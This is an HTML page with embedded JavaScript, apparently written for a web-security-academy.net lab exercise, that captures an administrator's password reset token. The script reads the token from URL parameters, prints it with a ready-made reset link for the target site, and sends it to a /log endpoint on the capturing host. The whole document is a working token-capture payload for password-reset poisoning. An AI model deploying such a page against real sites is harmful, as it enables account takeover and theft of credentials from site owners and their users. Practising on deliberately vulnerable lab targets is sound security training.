<!DOCTYPE html>
<html>
<head>
    <title>Token Capture</title>
</head>
<body>
    <h1>Password Reset Token Capture</h1>
    <p>This page will capture the admin's password reset token.</p>

    <div id="output"></div>

    <script>
        // Capture the reset token from URL parameters
        const urlParams = new URLSearchParams(window.location.search);
        const token = urlParams.get('reset_token') || urlParams.get('token') || urlParams.get('reset-token');

        if (token) {
            document.getElementById('output').innerHTML =
                '<h2>âœ… TOKEN CAPTURED!</h2>' +
                '<p><strong>Reset Token:</strong> ' + token + '</p>' +
                '<p>Use this token to reset the admin password:</p>' +
                '<code>https://0a0a004e034f7a8182e93d0c004d00b7.web-security-academy.net/forgot-password?reset_token=' + token + '</code>';

            // Log to console as well
            console.log('CAPTURED TOKEN:', token);

            // Also try to send to a log endpoint (if available)
            fetch('/log?token=' + encodeURIComponent(token), {method: 'GET'}).catch(e => {});
        } else {
            document.getElementById('output').innerHTML =
                '<p>Waiting for token... Current URL: ' + window.location.href + '</p>';
            console.log('No token found. Full URL:', window.location.href);
            console.log('Query params:', window.location.search);
        }

        // Log all parameters for debugging
        urlParams.forEach((value, key) => {
            console.log('Param:', key, '=', value);
        });
    </script>
</body>
</html>